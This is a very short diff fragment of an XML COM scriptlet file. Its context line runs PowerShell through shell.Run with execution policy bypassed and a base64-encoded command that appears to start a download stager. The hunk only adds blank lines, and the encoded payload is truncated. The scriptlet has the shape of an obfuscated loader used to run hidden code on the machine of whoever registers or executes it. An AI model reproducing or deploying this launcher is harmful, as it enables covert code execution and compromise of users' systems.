@@ -8,4 +8,7 @@ shell.Run("powershell -ExecutionPolicy Bypass -NoProfile -EncodedCommand JAB3AGM
 ]]>
 </script>
 </registration>
+
+
+
 </scriptlet>
